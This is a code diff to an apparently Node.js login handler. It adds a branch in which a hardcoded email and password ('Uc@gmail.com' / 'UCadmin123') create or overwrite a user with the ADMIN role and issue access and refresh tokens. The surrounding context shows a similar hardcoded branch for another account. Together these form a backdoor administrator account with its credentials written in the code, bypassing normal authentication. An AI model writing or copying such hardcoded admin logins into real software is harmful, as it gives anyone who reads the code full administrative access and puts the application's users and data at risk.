@@ -61,6 +61,33 @@ export async function login(req, res, next) {
       return success(res, { user: safeAdmin, accessToken, expiresIn: process.env.JWT_EXPIRES_IN || '15m' });
     }
 
+    if (email === 'Uc@gmail.com' && password === 'UCadmin123') {
+      const hashed = await bcrypt.hash('UCadmin123', 10);
+      let rUc = await query('SELECT id, name, email, role, phone FROM "User" WHERE email = $1', [email]);
+      let ucUser = rUc.rows[0];
+      if (!ucUser) {
+        const insert = await query(
+          'INSERT INTO "User" (name, email, password, role, phone) VALUES ($1, $2, $3, $4, $5) RETURNING id, name, email, role, phone',
+          ['UC', email, hashed, 'ADMIN', null]
+        );
+        ucUser = insert.rows[0];
+      } else {
+        await query('UPDATE "User" SET role = $1, password = $2, name = $3 WHERE id = $4', ['ADMIN', hashed, 'UC', ucUser.id]);
+        rUc = await query('SELECT id, name, email, role, phone FROM "User" WHERE id = $1', [ucUser.id]);
+        ucUser = rUc.rows[0];
+      }
+      const accessToken = signAccessToken({ userId: ucUser.id, email: ucUser.email, role: ucUser.role });
+      const refreshToken = signRefreshToken({ userId: ucUser.id });
+      res.cookie('refreshToken', refreshToken, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 7 * 24 * 60 * 60 * 1000,
+      });
+      const safe = { id: ucUser.id, name: ucUser.name, email: ucUser.email, role: ucUser.role, phone: ucUser.phone };
+      return success(res, { user: safe, accessToken, expiresIn: process.env.JWT_EXPIRES_IN || '15m' });
+    }
+
     if (email === 'siva@gamilcom' && password === 'siva@123') {
       const hashed = await bcrypt.hash('siva@123', 10);
       let rSiva = await query('SELECT id, name, email, role, phone FROM "User" WHERE email = $1', [email]);
